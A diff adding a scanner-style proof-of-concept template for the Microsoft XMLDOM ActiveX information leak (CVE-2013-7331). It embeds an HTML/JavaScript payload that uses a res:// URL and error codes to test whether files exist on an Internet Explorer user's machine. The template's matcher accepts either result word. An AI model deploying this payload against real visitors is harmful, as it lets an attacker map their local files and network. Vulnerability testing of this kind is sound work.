@@ -1,0 +1,45 @@
+[info]
+author = "ave"
+description = "通过构造包含res://协议URL的HTML页面，利用Microsoft.XMLDOM ActiveX控件处理资源标识符时返回的不同错误码，探测目标系统本地路径、UNC共享路径、内网主机名及内网IP地址的存在性。攻击者只需诱导用户使用IE浏览器访问恶意页面即可触发。"
+id = "POC-AVE-2013-0555"
+name = "Microsoft XMLDOM ActiveX 信息泄露漏洞 PoC"
+severity = "medium"
+tags = ["ave-2013-0555"]
+vuln_id = [
+    "CVE-2013-7331",
+    "AVE-2013-0555",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/poc.html"
+protocol = "http"
+
+[poc.requests.body]
+content = '''
+<html>
+<body>
+<script>
+var x = new ActiveXObject("Microsoft.XMLDOM");
+try {
+  x.load("res://C:\Windows\System32\kernel32.dll");
+} catch(e) {
+  if (e.number == -2147024894) document.write("FileNotFound");
+  else document.write("FileExists");
+}
+</script>
+</body>
+</html>'''
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "FileExists",
+    "FileNotFound",
+]
